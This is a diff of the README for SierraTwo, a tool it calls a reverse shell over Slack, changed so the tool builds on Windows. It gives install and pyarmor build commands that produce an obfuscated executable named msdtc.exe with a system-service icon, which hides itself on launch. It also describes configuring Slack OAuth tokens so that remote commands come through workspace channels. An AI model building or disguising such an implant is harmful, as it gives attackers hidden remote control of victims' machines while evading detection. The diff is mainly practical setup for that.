@@ -1,4 +1,4 @@
-# SierraTwo
+# SierraTwo (files modified so you can build on windows instead of linux)
 `SierraTwo` is a simple reverse shell over Slack. 
 
 <p align="center">
@@ -6,42 +6,25 @@
 </p>
 
 ## Usage
-`SierraTwo` only supports Python 3.6+.
+`SierraTwo` only supports Python 3.6+. (better you use the 3.8 it worked perfectly for me)
+link to [python 3.8](https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe)
 
 ### Direct Usage
 #### Windows
-Not available. Instead, refer to [building](#building) to build an `.exe` for Windows.
-
-#### Linux
 ```
-$ sudo apt install python3-pip
-$ sudo pip3 install -r requirements.txt
-$ python3 SierraTwo.py
+pip3 install -r requirements.txt 
+python3 SeirraTwo.py
 ```
-
 ### Building
 To build an executable:
-for linux:
-```
-$ sudo apt install python3-pip winbind wine winetricks
-$ wget https://www.python.org/ftp/python/3.8.2/python-3.8.2-amd64.exe
-$ wine python-3.8.2-amd64.exe
-$ sudo pip3 install -r requirements.txt
-$ wine pip install -r wine_requirements.txt
-$ python3 builder.py -o <TARGET SYSTEM>
-```
+
 for windows:
-> pip3 install -r wine_requirements.txt
-> pyarmor-7 pack -e --onefile  -n msdt SierraTwo.py
-This will create a dist directory in which there will be the final exe
-#### **BE SURE TO ADD PYTHON TO PATH WHEN INSTALLING WITH WINE**
+```
+> pip3 install -r requirements.txt
+> pyarmor-7 pack -e --onefile --icon media/msdtc.ico -n msdt SierraTwo.py
+```
+This will create a dist directory in which there will be the final .exe
 
-The following commands will setup Wine with 64 bit Python 3.8.2 on your system. `<TARGET SYSTEM>` can be either 
-`Windows` or `Linux`. After building the executable, check the `dist` folder for your exectuable.
-
-For example, running `./builder.py -o Linux` on a 64 bit Linux will generate a 64 bit obfuscated executable. Same 
-logic applies for `-o Windows`. If you want to generate a 32 bit obfuscated executable, you'd have to install 32 bit 
-Python instead of 64 bit (on your Linux and/or Wine).
 
 Both executables will be obfuscated using `pyarmor`.
 
@@ -49,10 +32,9 @@ If built for Windows:
 - The executable's name will be `msdtc.exe`
 - Executable will automatically minimize and hide itself
 
-If built for Linux:
-- The executable's name will be `system`
 
 ## Configuration
+Directly edit the variables(member id,Oath token etc) in the *SeirraTwo.py* as importing config.py gave some errors 
 To use `SierraTwo`, create or be a part of a Slack workspace where you an admin. Afterwards go to 
 [Slack API][Slack API] and create an app. From there, under the `Features` tab, go to `OAuth & Permissions` and add the 
 following scopes:
@@ -84,11 +66,11 @@ following scopes:
 | **admin**  | Administer the workspace |
 
 After setting the token scopes, copy and paste your `Member ID` (and others that will have access to the app), 
-`OAuth Access Token` and `Bot User OAuth Token` to `config.py`. Finally, install the app on the workspace.
+`OAuth Access Token` and `Bot User OAuth Token` to `SeirraTwo.py`. Finally, install the app on the workspace.
 
 ## Notes
 - The shells (or rooms in other words) will be created under the predetermined prefix. You can change this prefix in 
-`config.py`.
+SeirraTwo.py
 - Upon launch, `SierraTwo` will connect to the workspace and look for channels matching the prefix. If there are no 
 channels matching the prefix, `prefix-1` will be created. By default, this is `sierra-hotel-1`. However, if there is a 
 channel (or channels) matching the prefix, `SierraTwo` will get the largest number amongst the matching channels and 
